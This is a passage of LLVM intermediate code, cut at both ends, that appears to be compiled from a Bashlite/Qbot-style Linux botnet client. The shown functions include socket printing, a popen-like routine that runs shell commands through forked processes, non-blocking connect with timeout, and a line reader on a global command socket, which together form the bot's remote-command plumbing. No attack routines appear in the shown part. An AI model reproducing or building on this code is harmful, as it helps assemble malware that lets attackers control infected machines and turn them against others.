  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #14
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i64 @strlen(i8* %5) #14
  %12 = call i64 @send(i32 %0, i8* %5, i64 %11, i32 16384) #3
  %13 = trunc i64 %12 to i32
  call void @free(i8* %5) #3
  ret i32 %13
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #15
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #16
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #17
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #17
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #17
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !13
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #14
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #14
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #14
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @RandString(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %5 to %struct.timeval*
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  store <2 x i64> <i64 30, i64 0>, <2 x i64>* %5, align 16
  %8 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %9 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %8) #3, !srcloc !14
  %10 = srem i32 %0, 64
  %11 = zext i32 %10 to i64
  %12 = shl i64 1, %11
  %13 = sdiv i32 %0, 64
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %14
  %16 = load i64, i64* %15, align 8
  %17 = or i64 %16, %12
  store i64 %17, i64* %15, align 8
  %18 = add nsw i32 %0, 1
  %19 = call i32 @select(i32 %18, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %tmpcast) #3
  %20 = icmp sgt i32 %2, 1
  br i1 %20, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %29
  %.in = phi i32 [ %21, %29 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %30, %29 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %27, %29 ], [ %1, %.lr.ph.preheader ]
  %21 = add nsw i32 %.in, -1
  %22 = load i32, i32* @mainCommSock, align 4
  %23 = call i64 @recv(i32 %22, i8* nonnull %6, i64 1, i32 0) #3
  %24 = icmp eq i64 %23, 1
  br i1 %24, label %25, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %.lr.ph
  %26 = load i8, i8* %6, align 1
  %27 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %26, i8* %.01923, align 1
  %28 = icmp eq i8 %26, 10
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %25
  %30 = add nuw nsw i32 %.024, 1
  %31 = icmp sgt i32 %21, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %29, %25
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %27, %29 ], [ %27, %25 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %30, %29 ], [ %.024, %25 ]
